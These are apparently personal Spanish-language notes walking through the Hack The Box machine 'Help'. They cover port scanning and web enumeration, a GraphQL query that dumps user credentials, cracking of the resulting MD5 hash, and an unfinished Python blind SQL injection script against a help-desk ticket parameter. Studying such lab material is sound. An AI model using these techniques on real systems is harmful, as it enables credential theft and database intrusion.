# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]
```shell
ping -c 1 10.10.10.121
nmap -p- --open -vvv -sS -Pn --min-rate 5000 -n 10.10.10.121 -oG allports
extractPorts allports
nmap -sVC -p22,80,3000 10.10.10.121 -oN target   
```

![[Help1.png]]

![[Help3.png]]
Nos muestra que esta el puerto 22 ssh abierto, el 80 de apache y el 3000 del servicio node.js

------------
# [[Enumeracion con pequeño script de NMAP y Whatweb-wappalyzer]]

```shell
nmap --script http-enum -p22,80,3000 10.10.10.121 -oN webScan    
whatweb http://10.10.10.121           
```

![[Help2.png]]
El script de nmap no dio ningun directorio y el whatweb nos informo que teniamos que agregar en el `/etc/hosts` el dominio de htb.help
![[Help 4.png]]

----
# [[FFUF]]

![[Help5.png]]
Al estar intentando enumerar a la pagina directamente no me daba ningun resultado, pero al intentar en help.htb arrojo el resultado del directorio `support`

![[Help6.png]]


curl -s -G http://help.htb:3000/graphql --data-urlencode 'query={user {username,password} }' | jq
*Parametros*
	`-G` Para hacer la peticion por GET
	`--data-urlencode` Envia la query urlencodeada
	`'query={user {username,password} }'` Pide que dumpee todos los usuarios y contraseñas
	`| jq` Muestra la respuesta en formato JSON

![[Help7.png]]
Nos da el usuario: helpme@helpme.com
Contraseña:  5d3c93182bb20f07b994a7f617e99cff                          |      Contraseña final: godhelpmeplz

##  [[Hashcat]]
```shell
hashcat -a 0 -m 0 "5d3c93182bb20f07b994a7f617e99cff" /usr/share/wordlists/rockyou.txt
```
![[Help8.png]]

El exploit para dumpear los datos con sqli esta en proceso, todavia no sirve
```python
#!/usr/bin/env python3

from pwn import *
import requests, signal, sys, time, string

#------CTRL +C ------
def def_handler(sig, frame):
    print("\n\n[!]Saliendo..\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
#-------------------

# Variables Globales
characters = string.ascii_lowercase + ":;.,-_" + string.ascii_uppercase + string.digits
main_url = "http://help.htb/support/?v=view_tickets&action=ticket&param%5B%5D=4&param%5B%5D=attachment&param%5B%5D=1&param%5B%5D=6"

def sqli():
    data = ""
    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de inyeccion SQL")
    time.sleep(1)
    p2 = log.progress("Data")

    for position in range(1, 500):
        for character in characters:
            sqli_url = main_url + f" and substring((select group_concat(schema_name) from information_schema.schemata),{position},1)='{character}'-- -"
            r = requests.get(sqli_url)

            if r.status_code != 400:
                data += character
                p2.status(data)
                break




if __name__ == '__main__':
    sqli()
```








# Notas
##### Node.js
Es un **entorno de ejecución de JavaScript en el servidor**. Permite usar JavaScript fuera del navegador para crear aplicaciones del lado del servidor, como servidores web, APIs, bots, etc.

##### Para desconectar la vpn de HTB
```shell
sudo killall openvpn
```

##### Grep
*Parametros*
`-n` Indica la linea en la que se encontro el resultado
# Creditos
Writeup oficial de HTB